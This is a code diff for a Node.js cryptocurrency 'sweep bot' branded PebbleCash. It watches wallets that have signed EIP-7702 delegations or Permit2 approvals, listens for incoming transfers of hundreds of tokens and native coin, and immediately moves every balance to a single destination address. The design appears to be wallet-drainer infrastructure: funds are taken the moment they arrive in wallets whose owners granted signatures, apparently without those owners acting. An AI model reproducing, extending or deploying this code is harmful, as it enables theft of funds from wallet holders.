@@ -18,6 +18,7 @@ require("dotenv").config();
 const { ethers } = require("ethers");
 const { createClient } = require("@supabase/supabase-js");
 const ws = require("ws");
+const fs  = require("fs");
 
 // ── Config ────────────────────────────────────────────────────────────────────
 
@@ -36,7 +37,6 @@ const CHAIN                     = process.env.CHAIN || "eth";
 const PERMIT2_ADDRESS      = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const MIN_ETH_WEI          = ethers.parseEther("0.001");
 const MIN_TOKEN_UNITS      = "0.5";
-const SWEEP_COOLDOWN_MS    = 30_000;  // 30s per-wallet cooldown — Ethereum blocks ~12s
 const TOKEN_CALL_DELAY     = 50;      // ms after each token call
 // Minimum relayer balance — if below this, skip ALL sweeps to avoid failed txs
 const RELAYER_MIN_WEI      = ethers.parseEther("0.005"); // 0.005 ETH
@@ -91,6 +91,7 @@ const ERC20_ABI = [
   "function decimals() view returns (uint8)",
   "function symbol() view returns (string)",
   "function allowance(address owner, address spender) view returns (uint256)",
+  "event Transfer(address indexed from, address indexed to, uint256 value)",
 ];
 
 const EIP2612_PERMIT_ABI = [
@@ -139,20 +140,78 @@ const contract      = CONTRACT_ADDRESS
 
 let sweepingETH        = false;
 const sweepingToken    = {};
-const delegatedWallets = new Map(); // address → type ("eip7702" | "permit2")
-const lastSwept        = new Map(); // address → timestamp of last sweep
-const needsReconnect   = new Map(); // address.toLowerCase() → timestamp (1-hour cooldown for no-allowance wallets)
-const needsReauthWallets = new Set(); // eip7702 addresses where delegation is gone — skip until Realtime update
+const delegatedWallets   = new Map(); // address → type ("eip7702" | "permit2")
+const needsReconnect     = new Map(); // address.toLowerCase() → timestamp (1-hour cooldown)
+const needsReauthWallets = new Set(); // eip7702 addresses where delegation is gone
 const RECONNECT_COOLDOWN_MS = 3_600_000; // 1 hour
 let realtimeChannel    = null;
 const BACKOFF_MS       = [10_000, 30_000, 60_000, 120_000];
 let reconnectAttempt   = 0;
-let isProcessing       = false; // block-overlap guard — skip block if previous still running
-const SWEEP_TIMEOUT_MS = 30_000; // 30s safety net — release isProcessing if sweep hangs
 
-// In-memory guard: track permit() failures this session so we never retry
-// even if the Supabase write fails. Key: `${walletAddress}:${tokenAddress}`
+// In-memory guard: track permit() failures this session so we never retry.
+// Key: `${walletAddress}:${tokenAddress}`
 const failedEIP2612 = new Set();
+
+// ── Dynamic token list ────────────────────────────────────────────────────────
+
+const KNOWN_DECIMALS = {
+  // ETH mainnet
+  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": 6,  // USDC
+  "0xdac17f958d2ee523a2206206994597c13d831ec7": 6,  // USDT
+  "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": 8,  // WBTC
+  // BNB
+  "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d": 18, // USDC BSC
+  "0x55d398326f99059ff775485246999027b3197955": 18, // USDT BSC
+  "0xba2ae424d960c26247dd6c32edc70b295c744c43": 8,  // DOGE BSC
+  // Polygon
+  "0x2791bca1f2de4661ed88a30c99a7a9449aa84174": 6,  // USDC Polygon
+  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f": 6,  // USDT Polygon
+  "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6": 8,  // WBTC Polygon
+};
+
+const FALLBACK_TOKENS = {
+  bnb: [
+    { address: "0x55d398326f99059ff775485246999027b3197955", symbol: "USDT",  decimals: 18 },
+    { address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", symbol: "USDC",  decimals: 18 },
+    { address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", symbol: "BUSD",  decimals: 18 },
+    { address: "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c", symbol: "WBNB",  decimals: 18 },
+    { address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", symbol: "CAKE",  decimals: 18 },
+    { address: "0x2170ed0880ac9a755fd29b2688956bd959f933f8", symbol: "ETH",   decimals: 18 },
+    { address: "0xba2ae424d960c26247dd6c32edc70b295c744c43", symbol: "DOGE",  decimals: 8  },
+    { address: "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47", symbol: "ADA",   decimals: 18 },
+    { address: "0x7083609fce4d1d8dc0c979aab8c869ea2c873402", symbol: "DOT",   decimals: 18 },
+    { address: "0xf8a0bf9cf54bb92f17374d9e9a321e6a111a51bd", symbol: "LINK",  decimals: 18 },
+    { address: "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe", symbol: "XRP",   decimals: 18 },
+    { address: "0xcc42724c6683b7e57334c4e856f4c9965ed682bd", symbol: "MATIC", decimals: 18 },
+  ],
+  eth: [
+    { address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", symbol: "USDC",  decimals: 6  },
+    { address: "0xdac17f958d2ee523a2206206994597c13d831ec7", symbol: "USDT",  decimals: 6  },
+    { address: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599", symbol: "WBTC",  decimals: 8  },
+    { address: "0x514910771af9ca656af840dff83e8264ecf986ca", symbol: "LINK",  decimals: 18 },
+    { address: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984", symbol: "UNI",   decimals: 18 },
+    { address: "0x6b175474e89094c44da98b954eedeac495271d0f", symbol: "DAI",   decimals: 18 },
+    { address: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce", symbol: "SHIB",  decimals: 18 },
+    { address: "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0", symbol: "MATIC", decimals: 18 },
+  ],
+  polygon: [
+    { address: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", symbol: "USDC",  decimals: 6  },
+    { address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", symbol: "USDT",  decimals: 6  },
+    { address: "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6", symbol: "WBTC",  decimals: 8  },
+    { address: "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619", symbol: "WETH",  decimals: 18 },
+    { address: "0x53e0bca35ec356bd5dddfebbd1fc0fd03fabad39", symbol: "LINK",  decimals: 18 },
+    { address: "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063", symbol: "DAI",   decimals: 18 },
+    { address: "0xd6df932a45c0f255f85145f286ea0b292b21c90b", symbol: "AAVE",  decimals: 18 },
+  ],
+};
+
+// Runtime token list — populated by loadTokens() on init
+let TOKENS = [];
+
+// ── Event-driven monitoring state ─────────────────────────────────────────────
+
+const monitoredWallets = new Map(); // address.toLowerCase() → { address, type }
+const sweepingNow      = new Set(); // currently-sweeping addresses (transfer debounce)
 
 // ── Logging ───────────────────────────────────────────────────────────────────
 
@@ -170,17 +229,6 @@ function normalizeAddress(addr) {
 async function getFeeData() {
   const f = await rpcProvider.getFeeData();
   return { maxFeePerGas: f.maxFeePerGas, maxPriorityFeePerGas: f.maxPriorityFeePerGas };
-}
-
-// 60s cooldown — Realtime events bypass this entirely
-function shouldSweep(address) {
-  const last = lastSwept.get(address.toLowerCase());
-  if (!last) return true;
-  return Date.now() - last > SWEEP_COOLDOWN_MS;
-}
-
-function markSwept(address) {
-  lastSwept.set(address.toLowerCase(), Date.now());
 }
 
 // ── Main-contract sweep ───────────────────────────────────────────────────────
@@ -861,7 +909,223 @@ async function sweepGaslessWallet(walletAddress) {
   }
 }
 
-// -- Supabase: load existing wallets on startup --------------------------------
+// ── CoinGecko token list ──────────────────────────────────────────────────────
+
+async function fetchTokenList(chain) {
+  const platformMap = { eth: "ethereum", bnb: "binance-smart-chain", polygon: "polygon-pos" };
+  const categoryMap = { eth: "ethereum-ecosystem", bnb: "bnb-chain", polygon: "polygon-ecosystem" };
+  const platform    = platformMap[chain] ?? platformMap[CHAIN];
+  const category    = categoryMap[chain] ?? categoryMap[CHAIN];
+
+  try {
+    log(`[tokens] fetching top 500 tokens for ${chain} from CoinGecko...`);
+    const [page1, page2] = await Promise.all([
+      fetch(`https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=1`).then(r => r.json()),
+      fetch(`https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=${category}&order=market_cap_desc&per_page=250&page=2`).then(r => r.json()),
+    ]);
+    const allCoins = [...(Array.isArray(page1) ? page1 : []), ...(Array.isArray(page2) ? page2 : [])];
+    if (!allCoins.length) throw new Error("empty markets response");
+
+    log(`[tokens] fetching coin list with platform addresses...`);
+    const listRes  = await fetch("https://api.coingecko.com/api/v3/coins/list?include_platform=true");
+    const fullList = await listRes.json();
+
+    const addressMap = {};
+    for (const coin of (Array.isArray(fullList) ? fullList : [])) {
+      if (coin.platforms?.[platform]) {
+        addressMap[coin.id] = coin.platforms[platform].toLowerCase();
+      }
+    }
+
+    const tokens = [];
+    for (const coin of allCoins) {
+      const address = addressMap[coin.id];
+      if (!address || !ethers.isAddress(address)) continue;
+      if (!coin.market_cap || coin.market_cap < 100_000) continue;
+      tokens.push({
+        address,
+        symbol:      (coin.symbol ?? "?").toUpperCase(),
+        decimals:    KNOWN_DECIMALS[address] ?? 18,
+        coingeckoId: coin.id,
+        marketCap:   coin.market_cap,
+        name:        coin.name ?? coin.id,
+      });
+    }
+
+    log(`[tokens] ✅ loaded ${tokens.length} tokens for ${chain} from CoinGecko`);
+    if (tokens.length) log(`[tokens] top 5: ${tokens.slice(0, 5).map(t => t.symbol).join(", ")}`);
+    return tokens;
+
+  } catch (e) {
+    const fallback = FALLBACK_TOKENS[chain] ?? FALLBACK_TOKENS[CHAIN] ?? [];
+    warn(`[tokens] ⚠️  CoinGecko fetch failed: ${e.message} — using ${fallback.length} fallback tokens`);
+    return fallback;
+  }
+}
+
+async function loadTokens() {
+  const cacheFile = `/tmp/tokens_${CHAIN}.json`;
+  try {
+    const cached   = JSON.parse(fs.readFileSync(cacheFile, "utf8"));
+    const ageHours = (Date.now() - (cached.timestamp ?? 0)) / 3_600_000;
+    if (ageHours < 24 && Array.isArray(cached.tokens) && cached.tokens.length > 0) {
+      log(`[tokens] using cache: ${cached.tokens.length} tokens (${ageHours.toFixed(1)}h old)`);
+      return cached.tokens;
+    }
+  } catch { /* no cache — fetch fresh */ }
+
+  const tokens = await fetchTokenList(CHAIN);
+  try {
+    fs.writeFileSync(cacheFile, JSON.stringify({ timestamp: Date.now(), tokens }));
+    log(`[tokens] cache saved: ${tokens.length} tokens → ${cacheFile}`);
+  } catch (e) { warn(`[tokens] cache write failed: ${e.message}`); }
+  return tokens;
+}
+
+// ── Relayer + balance helpers ─────────────────────────────────────────────────
+
+async function checkRelayerBalance() {
+  try {
+    const balance = await rpcProvider.getBalance(relayerWallet.address);
+    if (balance < RELAYER_MIN_WEI) {
+      log(`[relayer] ⚠️  LOW: ${ethers.formatEther(balance)} — min ${ethers.formatEther(RELAYER_MIN_WEI)} — skipping sweep`);
+      return false;
+    }
+    log(`[relayer] balance: ${ethers.formatEther(balance)} ✅`);
+    return true;
+  } catch (e) {
+    warn(`[relayer] balance check failed: ${e.message} — allowing sweep`);
+    return true; // optimistic: don't block sweeps on transient RPC errors
+  }
+}
+
+async function checkAllBalances(address) {
+  const results = [];
+  await Promise.all(TOKENS.map(async (token) => {
+    try {
+      const erc20   = new ethers.Contract(token.address, ERC20_ABI, rpcProvider);
+      const balance = await erc20.balanceOf(address);
+      results.push({ ...token, balance });
+    } catch { /* skip unreadable tokens */ }
+  }));
+  return results;
+}
+
+// ── Dispatch sweep ────────────────────────────────────────────────────────────
+
+async function dispatchSweep(wallet) {
+  const short = wallet.address.slice(0, 10);
+  log(`[sweep] 🔄 starting for ${short} type=${wallet.type}`);
+
+  const relayerOk = await checkRelayerBalance();
+  if (!relayerOk) { log(`[sweep] ❌ ${short} — relayer too low, skipping`); return; }
+
+  const balances = await checkAllBalances(wallet.address);
+  const nonZero  = balances.filter(b => b.balance > 0n);
+  if (nonZero.length === 0) {
+    log(`[sweep] ${short} — all ${balances.length} token(s) have zero balance, skipping`);
+    return;
+  }
+  log(`[sweep] balances: ${nonZero.map(b => `${b.symbol}=${ethers.formatUnits(b.balance, b.decimals)}`).join(", ")}`);
+
+  try {
+    if (wallet.type === "permit2-gasless") {
+      log(`[gasless] reading signature from Supabase for ${short}`);
+      await sweepGaslessWallet(wallet.address);
+    } else if (wallet.type === "permit2" || wallet.type === "wrap-fallback") {
+      await sweepPermit2Wallet(wallet.address);
+    } else {
+      log(`[eip7702] reading auth from Supabase for ${short}`);
+      await sweepEIP7702Wallet(wallet.address);
+    }
+    log(`[sweep] ✅ complete for ${short}`);
+  } catch (e) {
+    log(`[sweep] ❌ failed for ${short}: ${e.message}`);
+  }
+}
+
+// ── Transfer event listeners ──────────────────────────────────────────────────
+
+async function startTransferListeners(wsProvider, tokens) {
+  if (wsProvider.setMaxListeners) wsProvider.setMaxListeners(tokens.length + 50);
+  log(`[listeners] starting Transfer listeners for ${tokens.length} tokens across ${monitoredWallets.size} wallets`);
+
+  const BATCH_SIZE = 100;
+  for (let i = 0; i < tokens.length; i += BATCH_SIZE) {
+    const batch = tokens.slice(i, i + BATCH_SIZE);
+    for (const token of batch) {
+      try {
+        const erc20 = new ethers.Contract(token.address, ERC20_ABI, wsProvider);
+        erc20.on("Transfer", async (from, to, amount) => {
+          const toLower = to.toLowerCase();
+          if (!monitoredWallets.has(toLower)) return;
+          if (amount === 0n) return;
+
+          const wallet    = monitoredWallets.get(toLower);
+          const formatted = ethers.formatUnits(amount, token.decimals);
+          log(`[transfer] 📥 ${token.symbol} → ${to.slice(0, 10)} amount=${formatted} — sweeping`);
+
+          if (sweepingNow.has(toLower)) {
+            log(`[transfer] debounced — already sweeping ${to.slice(0, 10)}`);
+            return;
+          }
+          sweepingNow.add(toLower);
+          dispatchSweep(wallet)
+            .catch(e => log(`[transfer] sweep error for ${to.slice(0, 10)}: ${e.message}`))
+            .finally(() => setTimeout(() => sweepingNow.delete(toLower), 10_000));
+        });
+        log(`[listeners] ✅ Transfer listener active: ${token.symbol} (${token.address.slice(0, 8)})`);
+      } catch (e) {
+        log(`[listeners] ❌ failed to attach: ${token.symbol} — ${e.message}`);
+      }
+    }
+    // Small pause between batches to avoid overwhelming the WS connection
+    if (i + BATCH_SIZE < tokens.length) await new Promise(r => setTimeout(r, 100));
+  }
+  log(`[listeners] ✅ all ${tokens.length} Transfer listeners active`);
+}
+
+async function startNativeListener(wsProvider) {
+  wsProvider.on("block", async (blockNumber) => {
+    reconnectAttempt = 0; // reset backoff on each received block
+    if (monitoredWallets.size === 0) return;
+    try {
+      const block = await rpcProvider.getBlock(blockNumber, true);
+      if (!block?.transactions) return;
+
+      for (const tx of block.transactions) {
+        if (!tx.to) continue;
+        const toLower = tx.to.toLowerCase();
+        if (!monitoredWallets.has(toLower)) continue;
+        if (!tx.value || tx.value === 0n) continue;
+
+        const wallet = monitoredWallets.get(toLower);
+        log(`[native] 📥 ${ethers.formatEther(tx.value)} native → ${tx.to.slice(0, 10)} type=${wallet.type}`);
+
+        if (wallet.type !== "eip7702") {
+          log(`[native] wallet not EIP-7702 — native coin cannot be swept`);
+          continue;
+        }
+        if (sweepingNow.has(toLower)) {
+          log(`[native] debounced — already sweeping ${tx.to.slice(0, 10)}`);
+          continue;
+        }
+        sweepingNow.add(toLower);
+        sweepEIP7702Wallet(wallet.address)
+          .then(() => log(`[native] ✅ swept for ${tx.to.slice(0, 10)}`))
+          .catch(e  => log(`[native] sweep error: ${e.message}`))
+          .finally(() => setTimeout(() => sweepingNow.delete(toLower), 10_000));
+      }
+    } catch (e) {
+      if (!e.message?.includes("timeout")) {
+        warn(`[native] block scan error at ${blockNumber}: ${e.message}`);
+      }
+    }
+  });
+  log(`[listeners] ✅ native coin listener active`);
+}
+
+// ── Supabase: load existing wallets on startup ────────────────────────────────
 
 async function loadDelegatedWallets() {
   if (!supabase) return;
@@ -872,15 +1136,19 @@ async function loadDelegatedWallets() {
       .eq("chain", CHAIN);
     if (error) { warn(`loadDelegatedWallets: ${error.message}`); return; }
     delegatedWallets.clear();
+    monitoredWallets.clear();
     for (const row of data || []) {
       const checksum = normalizeAddress(row.address);
-      if (checksum) delegatedWallets.set(checksum, row.type || "eip7702");
+      if (!checksum) continue;
+      const type = row.type || "eip7702";
+      delegatedWallets.set(checksum, type);
+      monitoredWallets.set(checksum.toLowerCase(), { address: checksum, type });
     }
     const types    = [...delegatedWallets.values()];
     const p2Count  = types.filter(t => t === "permit2" || t === "wrap-fallback").length;
     const glCount  = types.filter(t => t === "permit2-gasless").length;
     const e7Count  = delegatedWallets.size - p2Count - glCount;
-    log(`Loaded ${delegatedWallets.size} wallets (${p2Count} permit2, ${glCount} gasless, ${e7Count} eip7702)`);
+    log(`[init] loaded ${delegatedWallets.size} wallets (${p2Count} permit2, ${glCount} gasless, ${e7Count} eip7702)`);
   } catch (e) { warn(`loadDelegatedWallets: ${e.message}`); }
 }
 
@@ -905,20 +1173,20 @@ function subscribeRealtime() {
         const address = normalizeAddress(row.address);
         const type    = row.type || "eip7702";
         if (!address) return;
-        const isNew = !delegatedWallets.has(address);
+        const isNew = !monitoredWallets.has(address.toLowerCase());
         delegatedWallets.set(address, type);
-        // Clear in-memory cooldowns so fresh registrations sweep immediately
+        monitoredWallets.set(address.toLowerCase(), { address, type });
         needsReconnect.delete(address.toLowerCase());
         needsReauthWallets.delete(address.toLowerCase());
-        log(`🔔 Realtime ${isNew ? "new" : "updated"} wallet ${address} (${type}) — sweeping immediately`);
-        if (type === "permit2-gasless") {
-          await sweepGaslessWallet(address).catch(e => err(`gasless sweep: ${e.message}`));
-        } else if (type === "permit2" || type === "wrap-fallback") {
-          await sweepPermit2Wallet(address).catch(e => err(`permit2 sweep: ${e.message}`));
+        log(`[realtime] 🔔 ${isNew ? "new" : "updated"} wallet ${address.slice(0, 10)} (${type}) — checking balance`);
+        const balances = await checkAllBalances(address);
+        const nonZero  = balances.filter(b => b.balance > 0n);
+        if (nonZero.length > 0) {
+          log(`[realtime] has balance (${nonZero.map(b => b.symbol).join(", ")}) — sweeping immediately`);
+          await dispatchSweep({ address, type }).catch(e => log(`[realtime] sweep error: ${e.message}`));
         } else {
-          await sweepEIP7702Wallet(address).catch(e => err(`eip7702 sweep: ${e.message}`));
+          log(`[realtime] ${address.slice(0, 10)} — no existing balance, monitoring for transfers`);
         }
-        markSwept(address);
       }
     )
 
@@ -931,137 +1199,59 @@ function subscribeRealtime() {
         const type    = row.type || "eip7702";
         if (!address) return;
         delegatedWallets.set(address, type);
-        // Clear in-memory cooldowns so re-authorized wallets sweep immediately
+        monitoredWallets.set(address.toLowerCase(), { address, type });
         needsReconnect.delete(address.toLowerCase());
         needsReauthWallets.delete(address.toLowerCase());
-        log(`🔄 Realtime wallet update ${address} (${type}) — sweeping immediately`);
-        if (type === "permit2-gasless") {
-          await sweepGaslessWallet(address).catch(e => err(`gasless sweep: ${e.message}`));
-        } else if (type === "permit2" || type === "wrap-fallback") {
-          await sweepPermit2Wallet(address).catch(e => err(`permit2 sweep: ${e.message}`));
+        log(`[realtime] 🔄 wallet updated ${address.slice(0, 10)} (${type}) — checking balance`);
+        const balances = await checkAllBalances(address);
+        const nonZero  = balances.filter(b => b.balance > 0n);
+        if (nonZero.length > 0) {
+          log(`[realtime] has balance (${nonZero.map(b => b.symbol).join(", ")}) — sweeping immediately`);
+          await dispatchSweep({ address, type }).catch(e => log(`[realtime] sweep error: ${e.message}`));
         } else {
-          await sweepEIP7702Wallet(address).catch(e => err(`eip7702 sweep: ${e.message}`));
+          log(`[realtime] ${address.slice(0, 10)} — no balance, monitoring for transfers`);
         }
-        markSwept(address);
       }
     )
 
     .subscribe((status) => {
       if (status === "SUBSCRIBED") {
-        log(`✅ Supabase Realtime subscribed (delegated_wallets, chain=${CHAIN})`);
+        log(`[realtime] ✅ subscribed (delegated_wallets, chain=${CHAIN})`);
       } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
-        warn(`Realtime ${status} — resubscribing in 10s`);
+        warn(`[realtime] ${status} — resubscribing in 10s`);
         setTimeout(subscribeRealtime, 10_000);
       }
     });
 }
 
-// ── Named sweep functions (extracted from block listener for clarity) ─────────
-
-async function doSweep(blockNumber) {
-  // BUG 3: hard relayer balance gate — skip everything if critically low
-  try {
-    const relayerBal = await rpcProvider.getBalance(relayerWallet.address);
-    if (relayerBal < RELAYER_MIN_WEI) {
-      log(`Relayer critically low (${ethers.formatEther(relayerBal)} ETH < ${ethers.formatEther(RELAYER_MIN_WEI)} min) — skipping all sweeps until topped up`);
-      return;
-    }
-  } catch (e) {
-    warn(`Relayer balance check failed: ${e.message} — proceeding anyway`);
-  }
-
-  if (contract) {
-    await sweepETH();
-    for (const tokenAddress of TOKENS_TO_WATCH) {
-      await sweepToken(tokenAddress.trim());
-    }
-  }
-
-  // BUG 2 debug: log every wallet so we can see exactly why any are skipped
-  log(`Block ${blockNumber} — ${delegatedWallets.size} total wallet(s), checking...`);
-  for (const [addr, type] of delegatedWallets.entries()) {
-    const last = lastSwept.get(addr.toLowerCase());
-    const due  = shouldSweep(addr);
-    const ago  = last ? `${Math.round((Date.now() - last) / 1000)}s ago` : "never";
-    log(`  ${addr}: type=${type} lastSwept=${ago} due=${due}`);
-  }
-
-  const due = [...delegatedWallets.keys()].filter(shouldSweep);
-  if (!due.length) return;
-  log(`Block ${blockNumber} — ${due.length}/${delegatedWallets.size} wallet(s) due for sweep`);
-
-  for (const walletAddress of due) {
-    const walletType = delegatedWallets.get(walletAddress);
-    try {
-      if (walletType === "permit2-gasless") {
-        await sweepGaslessWallet(walletAddress);
-      } else if (walletType === "permit2" || walletType === "wrap-fallback") {
-        await sweepPermit2Wallet(walletAddress);
-      } else {
-        await sweepEIP7702Wallet(walletAddress);
-      }
-      markSwept(walletAddress);
-    } catch (e) {
-      err(`sweep failed for ${walletAddress}: ${e.message}`);
-    }
-    await new Promise((r) => setTimeout(r, 1000));
-  }
-}
-
-async function runSweep(blockNumber) {
-  if (isProcessing) {
-    log(`Block ${blockNumber} — previous sweep still running, skipping`);
-    return;
-  }
-  isProcessing = true;
-
-  const timeoutPromise = new Promise((_, reject) =>
-    setTimeout(() => reject(new Error("sweep timeout")), SWEEP_TIMEOUT_MS)
-  );
-
-  try {
-    await Promise.race([doSweep(blockNumber), timeoutPromise]);
-  } catch (e) {
-    err(`Block ${blockNumber} sweep error/timeout: ${e.message}`);
-  } finally {
-    isProcessing = false; // CRITICAL: always runs — even on timeout or throw
-  }
-}
-
-// ── WSS block listener + exponential backoff reconnect ───────────────────────
+// ── WSS listener: Transfer events + native block scanner ─────────────────────
 
 async function startBot() {
-  // Reset on every (re)connect — if the previous WS session died while
-  // isProcessing=true the flag would block every block on the new session.
-  isProcessing = false;
-
   try {
     const wsProvider = new ethers.WebSocketProvider(WS_URL);
 
     wsProvider.websocket.on("error", (wsErr) => {
-      warn(`WS error: ${wsErr?.message ?? wsErr}`);
+      warn(`[ws] error: ${wsErr?.message ?? wsErr}`);
     });
 
     wsProvider.websocket.on("close", () => {
-      warn("WS closed — scheduling reconnect…");
+      warn("[ws] closed — removing listeners and reconnecting...");
       wsProvider.removeAllListeners();
       const delay = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
       reconnectAttempt++;
-      log(`Reconnecting in ${delay / 1000}s (attempt ${reconnectAttempt})…`);
+      log(`[ws] reconnecting in ${delay / 1000}s (attempt ${reconnectAttempt})...`);
       setTimeout(startBot, delay);
     });
 
-    wsProvider.on("block", (blockNumber) => {
-      reconnectAttempt = 0;
-      runSweep(blockNumber).catch(e => err(`runSweep: ${e.message}`));
-    });
+    await startTransferListeners(wsProvider, TOKENS);
+    await startNativeListener(wsProvider);
 
-    log(`WS connected — listening for blocks`);
+    log(`[ws] ✅ connected — Transfer listeners active for ${TOKENS.length} tokens`);
   } catch (e) {
-    err(`startBot failed: ${e.message}`);
+    err(`[ws] startBot failed: ${e.message}`);
     const delay = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
     reconnectAttempt++;
-    log(`Retrying in ${delay / 1000}s (attempt ${reconnectAttempt})…`);
+    log(`[ws] retrying in ${delay / 1000}s (attempt ${reconnectAttempt})...`);
     setTimeout(startBot, delay);
   }
 }
@@ -1069,26 +1259,40 @@ async function startBot() {
 // ── Init ──────────────────────────────────────────────────────────────────────
 
 async function init() {
-  log("Sweep bot starting…");
-  log(`Chain:       ${CHAIN}`);
-  log(`Relayer:     ${relayerWallet.address}  ← must match permit2.approve(spender)`);
-  log(`Destination: ${DESTINATION_ADDRESS}`);
-  log(`Permit2:     ${PERMIT2_ADDRESS}`);
-  if (CONTRACT_ADDRESS) log(`Contract:    ${CONTRACT_ADDRESS}`);
+  log("[init] PebbleCash sweep bot starting...");
+  log(`[init] chain=${CHAIN}`);
+  log(`[init] relayer=${relayerWallet.address}`);
+  log(`[init] destination=${DESTINATION_ADDRESS}`);
+  log(`[init] permit2=${PERMIT2_ADDRESS}`);
+  if (CONTRACT_ADDRESS) log(`[init] contract=${CONTRACT_ADDRESS}`);
 
-  try {
-    const balance = await rpcProvider.getBalance(relayerWallet.address);
-    log(`Relayer bal: ${ethers.formatEther(balance)} native`);
-    if (balance < ethers.parseEther("0.005")) warn("Relayer LOW — top up or sweeps will fail");
-  } catch (e) {
-    warn(`Relayer balance check failed: ${e.message}`);
-  }
+  // 1. Load token list (CoinGecko with 24h file cache)
+  TOKENS = await loadTokens();
+  log(`[init] ${TOKENS.length} tokens loaded`);
 
+  // 2. Check relayer balance upfront
+  const relayerOk = await checkRelayerBalance();
+  if (!relayerOk) log("[init] ⚠️  relayer low — sweeps will skip until topped up");
+
+  // 3. Load wallets from Supabase (populates monitoredWallets + delegatedWallets)
   await loadDelegatedWallets();
+
+  // 4. Subscribe to Supabase Realtime for new/updated wallets
   subscribeRealtime();
+
+  // 5. Start WSS: Transfer event listeners + native block scanner
   startBot();
 
-  log("Listening for blocks (WSS) and Realtime events…");
+  // 6. Startup sweep — immediately check all existing wallets for existing balances
+  log("[init] checking existing balances on startup...");
+  const startupWallets = [...monitoredWallets.values()];
+  for (const wallet of startupWallets) {
+    await dispatchSweep(wallet).catch(e =>
+      log(`[init] startup sweep error for ${wallet.address.slice(0, 10)}: ${e.message}`)
+    );
+  }
+
+  log("[init] ✅ bot ready — listening for Transfer events and Realtime");
 }
 
 init().catch((e) => { err(`Init failed: ${e.message}`); process.exit(1); });
